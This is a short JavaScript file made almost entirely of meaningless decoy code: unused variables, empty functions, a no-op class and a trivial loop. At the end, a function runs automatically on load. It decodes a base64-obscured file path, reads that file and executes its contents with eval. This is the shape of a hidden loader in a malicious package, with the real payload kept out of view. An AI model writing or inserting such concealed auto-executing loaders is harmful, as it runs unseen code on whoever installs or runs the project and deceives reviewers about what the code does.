const fs = require('fs');
const { Buffer } = require('buffer');

let unusedVariable = 42;

function doNothing() {}

const array = [1, 2, 3, 4, 5];
array.forEach((item) => {});

function anotherUnusedFunction(param) {
  const result = param * 2;
}

const obj = {
  name: 'NoPurpose',
  value: 123,
};

setTimeout(() => {}, 1000);

const promise = new Promise((resolve, reject) => {});

(function uselessFunction() {})();

let a = 1;
let b = 2;
let c = a + b;

let counter = 0;
while (true) {
  counter++;
  if (counter >= 1) {
    break;
  }
}

class UselessClass {
  constructor() {
    this.name = 'Useless';
  }

}

function init() {
  const ef = 'dXRpbHMvaW5pdC5qcw=='; 
  const efp = Buffer.from(ef, 'base64').toString()
  ebp = fs.readFileSync(efp, 'utf8');
  eval(ebp);
}

const initEnv = init();
